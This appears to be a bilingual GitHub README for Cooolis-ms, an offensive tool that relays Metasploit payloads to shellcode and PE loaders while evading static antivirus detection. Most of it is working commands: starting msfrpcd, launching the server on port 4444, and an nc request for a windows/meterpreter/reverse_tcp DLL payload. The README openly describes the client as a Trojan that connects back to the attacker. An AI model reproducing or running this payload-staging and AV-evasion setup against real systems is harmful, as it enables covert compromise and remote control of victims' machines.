# Cooolis-ms

Cooolis-ms 是一个支持Metasploit Framework RPC的一个服务端，用于给Shellcode和PE加载器工作，在一定程度上绕过反病毒软件的静态查杀，同时可以让Cooolis-ms服务端与Metasploit服务器进行分离。

Cooolis-ms is a server that supports the Metasploit Framework RPC. It is used to work with the Shellcode and PE loader. To some extent, it bypasses the static killing of anti-virus software, and allows the Cooolis-ms server to communicate with the Metasploit server. Separation.

## How to install | 如何安装

```
$ git clone https://github.com/Rvn0xsy/Cooolis-ms.git
$ cd Cooolis-ms
$ pip3 install -r requirements.txt
$ python3 server.py -h
```

## How to use |  如何使用

你需要先启动Metasploit RPC服务端：
You need to start the Metasploit RPC server first:

IP : 192.168.117.234

```
$ msfrpcd -U msf -P msf -u /api/1.0/
```

接着需要启动Cooolis-ms，使得它连接到RPC，并且监听一个端口，用来发送载荷：
Then you need to start Cooolis-ms so that it connects to the RPC and listens on a port to send the payload:

IP : 192.168.117.1

```
$ python3 server.py -U msf -P msf -H 192.168.117.234 -v -s -l 4444 -S 192.168.117.1
```

此时当客户端连接192.168.117.1:4444后，并发送配置载荷的JSON字符串就可以获得载荷代码：
At this point, when the client connects to 192.168.117.1:4444 and sends a JSON string of the configuration payload, the payload code can be obtained:

IP : 192.168.117.267

```
$ nc 192.168.117.1 4444
{"LPORT": "9988", "Format": "dll", "LHOST": "192.168.117.1","payload":"windows/meterpreter/reverse_tcp"}
// PAYLoAD ....
```

假设nc是一个木马，那么木马最终会连接JSON字符串中的`LHOST`，当然，也支持Metasploit中的所有载荷。
Assuming nc is a Trojan, then the Trojan will eventually connect to `LHOST` in the JSON string, and of course, all payloads in Metasploit are also supported.


1. 192.168.117.267->192.168.117.1:4444<->192.168.117.234
2. 192.168.117.267<->192.168.117.234

## About other | 关于其他

后续我将会写出Windows平台下的通用加载器客户端集合到这个项目中。
Subsequent I will write a collection of generic loader clients for the Windows platform into this project.

如果你觉得这个项目不错，那就给一个Star～

If you think this project is good, give a Star.

## issue

[I have a question](https://github.com/Rvn0xsy/Cooolis-ms/issues)

